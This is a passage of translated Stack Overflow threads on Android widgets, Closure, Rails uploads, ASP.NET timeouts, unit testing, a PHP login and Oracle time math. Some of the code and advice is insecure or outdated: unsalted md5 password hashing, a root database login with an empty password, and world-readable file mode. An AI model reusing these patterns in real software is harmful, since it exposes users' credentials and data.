> 时间：2012-08-11T20:14:42.120
> 
> 标签：android, android-imageview, android-file

我对`Bitmap`对象进行了一些处理（质量改进和一些调整大小），然后`bitmap.compress()`通过提供文件名“myfile.png”使用函数存储它。

```
newbitmap = processImage(bitmap);
FileOutputStream fos = context.openFileOutput("myfile.png", Context.MODE_PRIVATE);
newbitmap.compress(CompressFormat.PNG, 100, fos); 
```

现在我想加载这个图像，`ImageView`但我不能`setImageBitmap()`这样做。有没有其他选择？

我不能使用的原因`setImageBitmap()`是我正在使用一个小部件，并且当图像很大时`RemoteViews`使用位图方法会导致**Failed Binder Transaction错误。**

我尝试使用下面的代码设置图像 uri，但图像未加载到`ImageView`：

```
RemoteViews rv = new RemoteViews(context.getPackageName(), R.layout.widget_layout);

File internalFile = context.getFileStreamPath("myfile.png");
Uri internal = Uri.fromFile(internalFile);
rv.setImageViewUri(R.id.widgetImageView, internal);
updateAppWidget(awID, rv); 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T13:52:24.337

将图像存储在内部存储器中时，您必须将模式设置为`MODE_WORLD_READABLE`而不是`MODE_PRIVATE`. 这是因为小部件由主屏幕进程处理，如果您不正确设置模式，它就无法访问您的文件。

所以替换这一行：

```
FileOutputStream fos = context.openFileOutput("myfile.png", Context.MODE_PRIVATE); 
```

和：

```
FileOutputStream fos = context.openFileOutput("myfile.png", Context.MODE_WORLD_READABLE); 
```

此外，使用`Uri.parse()`and`getPath()`代替`fromFile()`. `fromFile()`仅适用于 Android 2.2 及更高版本。

```
Uri internal = Uri.Parse(internalFile.getPath()); 
```

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T07:06:01.037

使用`rv.setUri(R.id.widgetImageView, "setImageURI", "file://myfile.png");`而不是`rv.setImageViewUri(R.id.widgetImageView, internal);`似乎可以正确加载图像。您可能想尝试一下。

如果这不起作用，仍然可以选择缩小图像，以便您可以使用该`setImageBitmap`方法。例子：

```
 public static Bitmap scaleDownBitmap(Bitmap photo, int newHeight, Context context) {

 final float densityMultiplier = context.getResources().getDisplayMetrics().density;        

 int h= (int) (newHeight*densityMultiplier);
 int w= (int) (h * photo.getWidth()/((double) photo.getHeight()));

 photo=Bitmap.createScaledBitmap(photo, w, h, true);

 return photo;
 } 
```

# google-closure - goog.ui.menuBar 在哪里提供？

> ID：11917306
> 
> 赞同：2
> 
> 时间：2012-08-11T20:15:17.387
> 
> 标签：google-closure, google-closure-library, plovr

我正在通过这个示例学习如何使用 Google Closure 库制作菜单栏。

[http://closure-library.googlecode.com/svn/trunk/closure/goog/demos/menubar.html](http://closure-library.googlecode.com/svn/trunk/closure/goog/demos/menubar.html)

但是，当我在自己的应用程序中试用代码时，Plovr 编译器会抱怨没有文件提供`goog.ui.menuBar`. 是`goog.ui.menuBar`Closure 库的一部分，还是有我必须下载才能使用它的插件/扩展？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T23:24:41.217

嵌入在 2012 年 2 月 8 日发布的 plovr [hg 修订 [4b3caf2b7d84](http://code.google.com/p/plovr/source/list) ] 中的 Closure 库的副本使用了2012 年 2 月 2 日的[Closure 库修订 1559 。](http://code.google.com/p/closure-library/source/detail?r=1559)

菜单栏小部件是在 2012 年 6 月 4 日的[Closure Library 修订版 1947](http://code.google.com/p/closure-library/source/detail?r=1947)中引入的。幸运的是，您可以下载最新版本的 Closure Library 并让 plovr 使用最新的副本，如下所示：

### plovr_config.json

```
{
  "id": "myapp",
  "inputs": [
    "/home/my_project/js/myapp.js"
  ],
  "closure-library": "/path/to/closure-library/closure/goog",
  "mode": "ADVANCED",
  "level": "VERBOSE",
  "output-file": "/home/my_project/build/myapp.compiled.js"
} 
```

> goog.ui.menuBar 在哪里提供？

`goog.ui.menuBar`在闭包库中提供`closure/goog/ui/menubar.js`。

# image - 一个人可以使用回形针通过一个多文件选择输入上传多个文件吗？

> ID：11917307
> 
> 赞同：4
> 
> 时间：2012-08-11T20:15:22.173
> 
> 标签：image, ruby-on-rails-3.1, paperclip

所以我在我的 rails 3.1 应用程序中使用回形针，

我正在使用关系向项目添加图像，以便每个项目可以有多个图像。

我想做的是能够单击浏览按钮并仅使用单个字段选择多个文件。而不是必须为每个字段一次处理一张图像。

任何人都知道如何做到这一点，或者有一个不需要Flash插件的好选择吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-12T09:54:36.690

我只使用一个控制器，没有关联（我的只是用于将多张图像上传到画廊），但我已经成功地做到了你的要求。您需要调整它以适应您的关系，但它对我来说非常有用（虽然在 IE 中不起作用），但我确信它打破了一些轨道约定，但这是我能想到的唯一方法来构建功能。

第一步是使用 HTML5 多标签设置上传字段以接受多个文件：

```
<%= f.file_field :photo, multiple: 'multiple' %> 
```

或者，如果您像我一样使用 simple_form：

```
<%= f.input :photo, input_html: { multiple: 'multiple' } %> 
```

下一步是更改创建控制器操作以接受和处理多个文件。这是我确定有些人会反对的一点，但是，嘿，它有效！

```
def create

  params[:photo][:photo].each do |photo|

    @params = {}
    @params['photo'] = photo

    @photo = Photo.new(@params)

    if !@photo.save
      respond_to do |format|
        format.html { redirect_to new_photo_path, error: 'An error occured uploading.' }
      end
    end
  end

  respond_to do |format|
    format.html { redirect_to photos_path, notice: 'Photos were successfully uploaded.' }
  end
end 
```

它比看起来更简单 - 对我来说，控制器名称是`photo`，字段名称也是如此，它解释了`params[:photo][:photo]`. 它基本上只是获取`:photo`请求的属性（控制器通常期望一个文件）并遍历已上传的文件，为每个文件创建一个新文件并将属性依次`Photo`设置为每个文件，然后尝试将其保存为如果发生错误，则会发出新的警报，否则一旦完成，它将重定向以显示照片。`photo``@params``Photo`

正如我所说，这对我很有用，我希望它对你也有帮助:)

**编辑**如果这没有帮助，你能告诉我为什么吗？在有人花时间帮助之后忽略这条信息不会让其他人想要帮助你。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-22T00:53:07.627

不要修改控制器，只需将`name:`属性添加到表单字段，如下所示：

```
<%= f.input_field :photo, as: :file, multiple: true, name: 'article[photo]' %> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-09T21:00:58.580

这是我的做法：

```
params[:photo][:photo].each do |photo|
  record = Photo.create(photo: photo)
  # if record.errors.any?
  #   flash[:notice] = record.errors.full_messages.to_sentence
  # end
end 
```

有关保存多条记录的替代方法，请参阅[此帖子。](https://stackoverflow.com/questions/19081129/how-would-i-save-multiple-records-at-once-in-rails)

# asp.net - Server.ScriptTimeout 在范围内设置全局？

> ID：11917317
> 
> 赞同：8
> 
> 时间：2012-08-11T20:16:31.710
> 
> 标签：asp.net

根据我的所有经验，无论是作为经典 ASP 还是 ASP.NET 开发人员，我一直都明白设置`Server.ScriptTimeout`值的调用在当前请求的范围内是本地的。换句话说，调用`Server.ScriptTimeout = 600`会将当前请求的处理时间设置为 10 分钟。对其他资源的后续甚至并发请求将使用`Server.ScriptTimeout`.

最近在一次代码审查中，我被告知设置一个值会设置站点中*每个*页面`Server.ScriptTimeout`的处理时间，直到应用程序池被回收。建议的“修复”类似于以下内容：

 *```
public class MyPage : Page {
  private const int desiredTimeout = 600;
  private int cachedTimeout;

  private void Page_Load(object sender, EventArgs e) {
    // cache the current timeout in a private store.
    cachedTimeout = Server.ScriptTimeout;
    Server.ScriptTimeout = desiredTimeout;
  }

  private void Page_Unload(object sender, EventArgs e) {
    // restore the previous setting for the timeout
    Server.ScriptTimeout = cachedTimeout;
  }
} 
```

这对我来说似乎很奇怪，因为`Server.ScriptTimeout = 1`在页面中调用的开发人员可能会关闭站点，因为每个其他页面只被允许处理一秒钟。此外，此行为会影响当前 Page_Load 和 Page_Unload 事件之间可能发生的任何当前请求 - 这似乎是并发噩梦。

然而，为了彻底，我制作了一个由两页组成的测试工具——**第一页**设置`Server.ScriptTimeout`了一个非常高的数字，**第二页**只显示了当前值`Server.ScriptTimeout`。无论我在**第一页**设置什么值，**第二页**总是显示默认值。因此，我的测试似乎验证了`Server.ScriptTimeout`它在范围内是本地的。

我确实注意到，如果我的 web.config 有 debug="true"，`Server.ScriptTimeout`则没有效果 - 而 MSDN 在他们的页面上明确说明了这一点。在这种模式下，所有读取值的调用都会`Server.ScriptTimeout`返回一个大得离谱的数字，无论我将其设置为什么。

所以我的问题是，为了绝对确保我没有遗漏任何东西，是否有一个实例设置一个值会影响*整个站点*`Server.ScriptTimeout`的处理时间（全局范围），或者我认为效果是本地的是否有效只针对*当前上下文*？我用谷歌搜索了这个问题无济于事，而 MSDN 似乎对这个问题保持沉默。

 **任何链接和/或经验 - 一种或另一种方式 - 将不胜感激！涵盖这方面的文档似乎很少，我将不胜感激任何权威信息。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-11T21:15:46.120

它确实是特定于请求的：

```
public int ScriptTimeout
{
    get
    {
        if (this._context != null)
        {
            return Convert.ToInt32(this._context.Timeout.TotalSeconds, CultureInfo.InvariantCulture);
        }
        return 110;
    }
    [AspNetHostingPermission(SecurityAction.Demand, Level=AspNetHostingPermissionLevel.Medium)]
    set
    {
        if (this._context == null)
        {
            throw new HttpException(SR.GetString("Server_not_available"));
        }
        if (value <= 0)
        {
            throw new ArgumentOutOfRangeException("value");
        }
        this._context.Timeout = new TimeSpan(0, 0, value);
    }
} 
```

[HttpContext](http://msdn.microsoft.com/en-us/library/system.web.httpcontext.aspx)`_context`在哪里***

# java - 单元测试的意义何在？

> ID：11917323
> 
> 赞同：36
> 
> 时间：2012-08-11T20:17:05.690
> 
> 标签：java, testing

我最近加入了一个大量使用单元测试的团队。没有人能向我解释为什么这种形式的测试如此重要，但他们将其视为法律。

我知道自动化测试的想法是防止回归，但我不知道这怎么会是一个问题。模块化的、面向对象的、简洁的代码，注释很好，不会有回归问题。如果您第一次就正确构建它，并为将来不可避免的功能添加设计进行设计，那么您将永远不需要测试。

而且，这难道不是优雅的错误处理和日志记录应该完成的吗？当您可以确保所有外部依赖项首先仔细检查它们的可用性时，为什么要花费数周时间来讨论断言语句和单元测试？

我是否傲慢地得出这样的结论，即单元测试是“糟糕”代码库的拐杖，这些代码库有缺陷且构建不佳？

这是一个严重的问题。我在任何地方都找不到任何好的答案，如果我质疑自动化测试的目的，我所问的每个人似乎都认为我是一个巨魔。

编辑：谢谢你的回答，我想我现在明白了。我看到一些人投票删除，但我要感谢回答的人；它确实有帮助！

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-08-11T20:19:49.853

没有人是完美的——你最终会犯错。单元测试旨在捕捉和查明错误的位置，以便：

*   增加对您编写的代码正确性的信心
*   增加对重构正确性的信心
*   使跟踪*在*测试阶段引入错误的位置变得更加简单

错误处理和日志记录仅在触发错误时才有帮助；**单元测试是在测试**而不是生产中触发错误的原因。

* * *

# 考虑以下...

您有一个包含 3 个不同部分的软件，每个部分都有 2 个不同的选项。

```
 A      C      E
    / \    / \    / \
in-<   >--<   >--<   >-out
    \ /    \ /    \ /
     B      D      F 
```

您可以通过手动输入输入并检查输出来测试这一点——首先您输入一些触发 A、C、E 的输入；然后你会放入一些做 A、C、F 的东西，等等，直到你通过 B、D、F 覆盖所有内容。

但请记住，B、D 和 F 每个都有自己的单独参数和需要测试的流程——我们会说每个可能有 10 个变体。因此，这至少是`10*10*10 = 1000`您需要检查的不同输入，*仅*适用于 A、C、E 情况。通过这 6 个组件有 8 种不同的可能流程，因此您需要检查**8000**种不同的输入组合，以确保您点击了所有不同的可能输入。

另一方面，您可以进行单元测试。如果您明确定义了每个组件的单元边界，那么您可以为 A 编写 10 个单元测试，为 B 编写 10 个单元测试，以此类推，测试这些边界。这为您提供了总共 60 个组件的单元测试，加上少数（比如每个流 5 个，所以 40 个）集成测试，以确保所有组件都正确绑定在一起。总共有**100 个**测试有效地完成了相同的功能覆盖。

通过使用单元测试，您将获得等量覆盖所需的测试量减少了大约**80**倍！这是一个相对微不足道的系统。现在考虑更复杂的软件，其中组件的数量几乎肯定大于 6，并且这些组件处理的可能情况的数量几乎肯定大于 10。您从单元测试而不是集成测试中获得的节省会不断增加。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-08-11T20:26:15.610

简短的回答：是的，你很傲慢。;)

假设你真的*是*完美的，你的代码不仅在你编写的时候是正确和完美的，而且它还考虑到了所有未来的需求。

现在......你怎么*知道*你的代码是完美和正确的？你需要测试它。如果它没有经过测试，你就不能*相信*它有效。

这不仅仅是关于回归（因为这意味着代码*过去*可以工作。如果它*从来没有*工作怎么办？第一次编写时它是错误的）

> 我知道自动化测试的想法是防止回归，但我不明白这首先会成为一个问题。模块化的、面向对象的、简洁的代码，注释很好，不会有回归问题。

谁告诉你的？那个人应该被鞭笞。面向对象的代码和其他代码一样容易出错。它没有什么神奇之处，它不是灵丹妙药。归根结底，每当您更改一段代码时，都有可能在某处破坏某些东西。根据所讨论的代码，机会可能更大或更小，但无论代码多么好，除非您对其进行测试，否则您无法*确定*您没有引入回归。

> 如果您第一次就正确构建它，并为将来不可避免的功能添加设计进行设计，那么您将永远不需要测试。

但是，您如何在第一次正确构建它？正如我上面所说，要做到这一点，您需要进行测试，以向您展示代码是否*有效*。但更重要的是，您如何“设计”未来将添加的功能？你甚至还不知道它们是什么。

> 而且，这难道不是优雅的错误处理和日志记录应该完成的吗？当您可以确保所有外部依赖项首先仔细检查它们的可用性时，为什么要花费数周时间来讨论断言语句和单元测试？

一点都不。

您的代码当然应该处理错误情况，它当然应该记录您需要记录的内容。

但是您仍然需要知道它正确地完成了这一切。而且你需要知道它也能正确处理*非错误*条件！很高兴知道“如果 SQL 服务器不可用，我们会向用户显示一个很好的错误消息并退出”。但如果它*可用*呢？那么你的应用程序有效吗？

对于任何重要的应用程序，都有*很多*事情可能出错。有很多功能、很多代码和很多不同的执行路径。

尝试手动测试它永远不会使用所有这些代码路径。它永远不会在每种情况下测试每个功能的各个方面。即使确实如此，那也只会告诉您“代码今天有效”。明天能用吗？你怎么知道？当然，您的直觉可能会告诉您“从那以后我提交的代码没有破坏任何东西”，但是您怎么知道呢？你需要再次测试它。然后再次。然后再次。

你问单元测试是否是糟糕代码库的拐杖。他们是相反的。他们是检查，医生访问，防止代码库变坏。他们不只是告诉你你的代码是否工作，而是告诉你*什么时候*工作，更重要的是，什么时候*停止*工作。你不认为你会引入任何回归吗？你有多确定？你能承担错吗？

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-08-11T20:19:59.993

当您第一次开始编写代码时，它可能看起来非常简单并且不需要自动化测试。

但是随着时间的推移，您的代码会增长，需求会发生变化，团队也会发生变化。对自动化测试的需求也将增长。如果没有自动化测试，开发人员将害怕重构代码——尤其是如果他们不是编写代码的人。即使使用精心设计的代码添加新功能也会破坏现有功能。但是代码并不总是经过精心设计。在实践中，您可能需要做出妥协。由于各种原因，您的某些代码不会像您希望的那样干净和可维护。当您意识到您需要自动化测试时，可能无法添加它们，因为您的某些类可能难以测试。要添加第一个自动化测试，您可能必须首先重写或重构大量代码。

如果您从一开始就有自动化测试，这将确保您将代码设计为可*自动测试*的。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-08-11T23:21:46.970

我还有两点要补充：

1.  我发现单元测试的最大好处是当我必须编写作为代码客户端的测试时发生的微妙转变。如果很难测试，就很难使用。我经常进行界面更改，最终使用户的生活变得更好。
2.  编写单元测试是一种文档形式。它告诉人们“这里是如何使用（和滥用）我的课程”。未来的客户应该有很多关于如何使用你的代码的内置示例；单元测试给他们。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2012-08-11T20:26:28.233

我向我的一位教授提出了同样的问题，并且是长期的导师，他发誓，他在这里提到或被提到的许多人中的一个是：

他说测试是记录代码的好方法，如果您有兴趣了解代码在测试中应该如何表现，它会让您了解它试图做什么，而不必弄清楚它的复杂性，同时你可以检查它是否真的这样做，所以它是双赢的...... :)

虽然我有一种感觉，但他只是说，因为他知道我不喜欢评论代码，但更喜欢自我记录的源代码，这仍然是一种有趣的观点；）

作为旁注，您还应该查看[覆盖率](http://en.wikipedia.org/wiki/Code_coverage)，当您进行单元测试或设计测试套件时，您希望覆盖率尽可能接近 100%，这意味着测试已经测试了 100% 的代码，包括所有它可以采用不同的路径，这非常具有挑战性，并且可以使您的测试代码比您的源代码大几倍，尽管您也可以自动化您的测试代码，一个简单的例子是测试一个 sql 数据库，您可以创建一个生成的程序所有可能的 sql 语句和测试它们都被正确执行，我认为 sqlite3 有超过 9100 万行测试，[http://www.sqlite.org/testing.html](http://www.sqlite.org/testing.html)非常有趣......哦，这`he`也是提倡的。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2012-08-11T20:26:48.613

> 我知道自动化测试的想法是防止回归，但我不明白这首先会成为一个问题。

除了已经给出的好建议之外，我还要补充一点，*回归是不可避免的*。即使在行业工作很短的时间——嗯，足够长的时间来经历多个发布周期——你就会意识到旧的错误往往会再次出现，原因有很多。

一个特别的原因：程序员倾向于一遍又一遍地犯同样的简单错误。例如：当您的一位开发人员重构该日期处理代码时，他将继续做出错误假设，例如二月总是有 29 天，或者更糟的是，所有月份的长度都相同。

回归测试是您对此类事情的唯一防御。

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2012-08-11T23:00:42.957

好的，所以我以前的想法有点像你现在的想法，所以我想我会对你的一些陈述发表评论，并对你的陈述给出另一种观点。也许这可以揭示测试驱动开发真正的不同编码方法。

> 我知道自动化测试的想法是防止回归，但我不明白这首先会成为一个问题。

回归通常不仅仅是在对先前代码的工作理解不足的情况下进行的修改吗？如果是这样，您如何确保所有开发人员都以这样一种方式记录其代码的功能，以便您可以自动检测到后期是否有人进行了破坏性更改？单元测试可能有帮助吗？

> 模块化的、面向对象的、简洁的代码，注释很好，不会有回归问题。

如果您假设文档写得非常好以至于几乎不可能误解它，并且对所述程序的每个后续修改都是由足够熟练的编码人员以手术般精确的方式完成的，那么回归可能没有问题事实上绝不会改变旧的行为。

如果您将单元测试视为记录行为的一种方式，它难道不是一种同样或更有效的方式来传达旧代码的功能吗？

测试当然不应该排除文档，但是每个工具都有自己的优点和缺点。

> 如果您第一次就正确构建它，并为将来不可避免的功能添加设计进行设计，那么您将永远不需要测试。

在我看来，从一开始就构建正确和灵活的一切所涉及的成本和努力是巨大的，并且通常会导致两件事：过于复杂的系统和缓慢的开发速度。

问问自己：灵活性的成本是多少？您是否通过为每个问题构建多个解决方案并促进它们之间的运行时切换来最小化风险？或者您正在构建允许在运行时修补行为的插件系统？这两种策略都非常昂贵，无论是在开发时间上还是在增加项目的复杂性上。

如果您只是立即构建您需要的东西，并尝试作为一个团队保持足够的灵活性，以便在需要时快速编写任何修改，那么您将在每次实施中节省多少时间和精力？

如果您对现有功能进行测试，扩展功能会变得更容易吗？

> 而且，这难道不是优雅的错误处理和日志记录应该
> 完成的吗？当您可以确保所有外部依赖项首先仔细检查它们的可用性时，为什么要花费数周时间来讨论断言语句和单元测试？

优雅的错误处理和日志记录可能是一种很好的后备方式，但故障恢复永远不能代替正确性。我觉得我无法进一步评论，因为当您说“优雅的错误处理”和“双重检查可用性”时，我不确定您指的是什么，但这对我来说听起来像是恢复。没有错误比能够从错误中恢复要好得多。

> 我是否傲慢地得出这样的结论，即单元测试是“坏”代码库的拐杖，这些代码库有缺陷且构建不佳？这是一个严重的问题。我在任何地方都找不到任何好的答案，如果我质疑自动化测试的目的，我问的每个人似乎都认为我是一个巨魔。

您当然可以使用单元测试作为避免文档和良好编码原则的借口。这是我在很多地方看到的。但它也是一个很好的工具，可以添加到您的工具箱中，以提高产品的正确性、简单性和灵活性！祝你的新团队好运。我相信你可以教他们一两件事关于好的文档和其他有助于避免错误的原则，他们可能会带来一些原则，这些原则可以帮助你更快、更省力地开发产品，同时避免指数级的复杂性增长。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2012-08-11T21:08:33.887

> 模块化的、面向对象的、简洁的代码，注释很好，不会有回归问题。

即使评论很好，评论也只描述了预期的行为。函数可以对线性集合进行排序，但使用冒泡排序而不是快速排序。到那时，评论就变成了一条红鲱鱼（特别是如果你抱怨排序需要永远，但你争辩说，一个小时后，它会正确排序）。很可能是排序算法的原始设计者打算在非常小的列表上使用冒泡排序，然后在较大的列表上切换到快速排序，但是没有测试来验证这一点，如果不深入研究代码就无法检查根据。

此外，代码库的功能和规范可能会在一个小时内迅速发生变化，具体取决于您或您的商店所做的事情。文档是实际开发的主要障碍。最好*有一套*测试用例来确保没有回归。

> 如果您第一次就正确构建它，并为将来不可避免的功能添加设计进行设计，那么您将永远不需要测试。

两个字： **敏捷开发。** 设计只是“刚刚好”，并且添加比当时指定的更多的功能在很大程度上违反了[YAGNI](http://en.wikipedia.org/wiki/You_ain%27t_gonna_need_it)。你最终会花费更多的时间来开发边缘案例而不是开发主要案例。

> 而且，这难道不是优雅的错误处理和日志记录应该完成的吗？当您可以确保所有外部依赖项首先仔细检查它们的可用性时，为什么要花费数周时间来讨论断言语句和单元测试？

错误处理告诉您出了点问题。单元测试可以告诉你*在哪里*。您只能通过适当的测试确保一切都与您的代码库一样。

任何人都可以编写混淆代码并告诉你它是完全正确的。任何继承该代码库的人都无法分辨。单元测试有助于缓解这个问题。

> 我是否傲慢地得出这样的结论，即单元测试是“坏”代码库的拐杖，这些代码库有缺陷且构建不佳？

一点点。代码库不一定要“坏”才能需要单元测试，它们只需要更改即可。（更改代码库和不需要单元测试的代码不能存在于同一维度中。）

您没有考虑的另一种情况是您继承的代码库，您的客户声称缺少功能或无法正常工作。它可能是其中的一两个部分，但它们有一些非常时髦的依赖关系；你不能只拿你最喜欢的编辑器，然后用大锤浏览它。为了保证您不会影响*暂时有效的*代码，并希望修复/实现新代码，您必须为您希望更改的模块编写回归测试。

错误的修复成本也更高，它传播的越远，它也越多。在开发中发现的 bug 比在 QA 中发现的 bug 比在发布候选中发现的 bug 比在公共版本中发现的 bug 更便宜。

这里还有一些其他挥之不去的问题，例如编程成本（维护成本是它的主要成本，而不是新开发），以及向遗留代码添加新功能，但在大多数情况下，单元**非常**重要测试完成。如果您在没有某种单元回归的代码库中工作*，*那么您将花费太多时间来修复测试可能已经涵盖的错误。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2012-08-12T21:39:16.840

100% 的单元测试覆盖率允许您的代码从两个不同的角度执行。通常，您的代码仅在程序运行时执行。单元测试以另一种更模块化的方式测试流程。想想会计中的复式簿记。（我听说这是现代资本主义的基石）在这里，每个事件都在两个不同的分类账中出现两次。最后余额应该为零。这种记账方式一直在自我检查。这就是我对单元测试的看法。

我还发现执行测试优先设计使我的代码更清晰，更易于管理。通过首先编写测试，我可以准确地思考类应该做什么。

# php - 不确定PHP登录问题

> ID：11917330
> 
> 赞同：1
> 
> 时间：2012-08-11T20:18:06.653
> 
> 标签：php, mysql, html

这是我一直在研究的登录系统。似乎无论我做什么，即使登录有效，它也会直接将我发送到错误页面。

1.  我正在从表单中获取用户名/密码字符串。
2.  查询是正确的，我测试了它，然后我绑定了这些变量。
3.  然后它把我送到错误页面。如何检查我是否正确检索行？

* * *

```
 <?php 
    function clean($str)
    {
        $str = @trim($str);
        if(get_magic_quotes_gpc()) {
            $str = stripslashes($str);
        }
        return mysql_real_escape_string($str);
    }

    //Sanitize the POST values

    $username = clean($_POST['username']);
    $password = clean($_POST['password']);

    /* Create a new mysqli object with database connection parameters */
    $mysqli = mysqli_connect('localhost', 'root', '', 'draftdb');

    if(mysqli_connect_errno()) 
    {
        echo "Connection Failed: " . mysqli_connect_errno();
        exit();
    }

    /* Is your username the same as the login_id? If not you need to change this query's where to use the username column not the login_id. */

    /* Create a prepared statement */
    if($stmt = $mysqli -> prepare("
        SELECT Login_ID, Login_PW
        FROM login  
        WHERE Login_ID=? AND Login_PW=?
    "))
    {
        /* Bind parameters
             s - string, b - boolean, i - int, etc */
        $stmt -> bind_param("ss", $username, md5($password));

        /* Execute it */
        $result = $stmt -> execute();

        //Check whether the query was successful or not
        if ($result === false) 
        {
            die("Query failed");
        }

        /* Bind results to variables that will be used within the fetch() loop. */
        $stmt -> bind_result($username, $password);

          /* Check the number of rows returned. */
        if ($stmt->num_rows !== 1) {
            //Login failed

            header("location: login-failed.php");
            exit();
        }

        /* Iterate over the results of the query. */
        while ($stmt->fetch())  
        { 
            //Login Successful
            if($stmt->num_rows > 0) 
            {
            session_regenerate_id();
            /* We can use $login_id, $firstname and $lastname cause we binded the result to those variables above. */
            $_SESSION['SESS_MEMBER_ID'] = $username;

            session_write_close();
            header("location: member-index.php");
            exit();
            }
         }//main if close

          /* Close statement */
          $stmt -> close();
       }

       /* Close connection */
       $mysqli -> close();
    ?> 
```

## **更新得出结论，我没有从我的表单中得到任何传递给我的 php 脚本的东西**

```
<table width="300" border="0" align="center" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC">
<tr>
<form name="form1" method="POST" action="login.php">
<td>
<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#FFFFFF">
<tr>
<td colspan="3"><strong>Member Login </strong></td>
</tr>
<tr>
<td width="78">Username</td>
<td width="6">:</td>
<td width="294"><input name="username" type="text" id="username"></td>
</tr>
<tr>
<td>Password</td>
<td>:</td>
<td><input name="password" type="text" id="password"></td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td><input type="submit" name="Submit" value="Login"></td>
</tr>
</table>
</td>
</form>
</tr>
</table> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:25:20.000

将您的表单标签移动到您的表格之外`<form name="form1" method="POST" action="login.php">`-`</form>`

```
<form name="form1" method="POST" action="login.php">
<table width="300" border="0" align="center" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC">
<tr>
<td>
<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#FFFFFF">
<tr>
<td colspan="3"><strong>Member Login </strong></td>
</tr>
<tr>
<td width="78">Username</td>
<td width="6">:</td>
<td width="294"><input name="username" type="text" id="username"></td>
</tr>
<tr>
<td>Password</td>
<td>:</td>
<td><input name="password" type="text" id="password"></td>
</tr>
<tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td><input type="submit" name="Submit" value="Login"></td>
</tr>
</table>
</td>
</tr>
</table>
</form> 
```

表单不允许作为`table`,`tbody`或的子元素`tr`。它需要位于外部`table`或完全内部`<td> <form ...> </form> </td>`

# ollydbg - OllyDbg 在 Win7x64 中错误地将行替换为“jmp 71B00000”

> ID：11917336
> 
> 赞同：1
> 
> 时间：2012-08-11T20:19:19.590
> 
> 标签：ollydbg

我花了很多时间来寻找解决这个问题的方法。如您所知，OllyDbg 是一种流行的调试器，但在 Win7 x64 上存在问题。

我用 olly 打开的每个文件（使用不同的编译器！）它都会用以下内容替换一些第一行：

```
jmp 71B00000 
```

像“comodo 沙盒，兼容性”这样的建议不起作用，我不想使用虚拟机。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T18:33:07.373

我有同样的问题并设法解决它。如果您确实安装了 comodo 防火墙，则必须将其卸载，重新启动，然后重新安装。确保您永远不会再次打开沙盒。出于某种原因，即使沙盒关闭，在 win7 x64 上激活后，它仍然会与您的软件混淆。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:28:44.940

根据[OllyDbg 主页](http://www.ollydbg.de/)和[当前版本的 changelog](http://www.ollydbg.de/version2.html)，OllyDbg 尚不支持调试 64 位可执行文件。它似乎还没有在 Windows 64 位上接受测试，尽管它可能仍适用于 32 位可执行文件。

看来你暂时不走运了……

# ruby-on-rails - 我如何有时需要密码，有时不需要 has_secure_password？

> ID：11917340
> 
> 赞同：7
> 
> 时间：2012-08-11T20:19:48.010
> 
> 标签：ruby-on-rails

我的应用程序允许人们使用密码或 Facebook 进行注册。

即使我从用户模型中删除密码验证，我也会`:password_digest => ["can't be blank"]`进入用户模型。

我用`has_secure_password`.

我怎样才能使`password_digest`不需要？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-11T20:22:45.640

你不能。[`has_secure_password`](http://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password)自动将两个验证器添加到您的模型中：

```
validates_confirmation_of :password
validates_presence_of     :password_digest 
```

`password_digest`相反，为没有密码的用户提供一个虚拟值：

```
user.password = user.password_confirmation = ""
user.password_digest = "facebook-authorized account" 
```

这是安全的，因为不可能对密码进行哈希处理以匹配该摘要。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-05-23T14:07:53.607

最近的提交添加了一个选项哈希`has_secure_password`，允许跳过对 password_digest 字段的验证。你像这样使用它：

```
 has_secure_password :validations => false 
```

不幸的是，这在 3.2.13 版本的 rails 中不存在。参考[https://stackoverflow.com/a/16706045/1356792](https://stackoverflow.com/a/16706045/1356792)

# oracle - HH.MM 格式的分钟数

> ID：11917342
> 
> 赞同：2
> 
> 时间：2012-08-11T20:19:51.287
> 
> 标签：oracle, time

我正在使用以下查询

```
(24 * extract(day from (sysdate - c.LOADING_TIME) day(9) to second))
       + extract(hour from (sysdate - c.LOADING_TIME) day(9) to second)
       + ((1/100) * extract(minute from (sysdate - c.LOADING_TIME) day(9) to second)) -
required_time/60 
```

现在我得到的数据类似于 6.76。问题是我没有在 HH.MM 中转换 required_time。这个怎么做？

ps 请注意，required_time 表示分钟（整数）我需要输出为 5.45，这意味着 5 小时 45 分钟

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-12T00:24:40.863

因此，您有`LOADING_TIME DATE`和`REQUIRED_TIME INTEGER`，并且您正在尝试确定实际加载时间 (SYSDATE - LOADING_TIME) 和标准加载时间 (REQUIRED_TIME) 之间的差异。

如果我做对了，请尝试以下操作：

```
WITH e AS 
  (SELECT NUMTODSINTERVAL((SYSDATE - LOADING_TIME), 'DAY') -
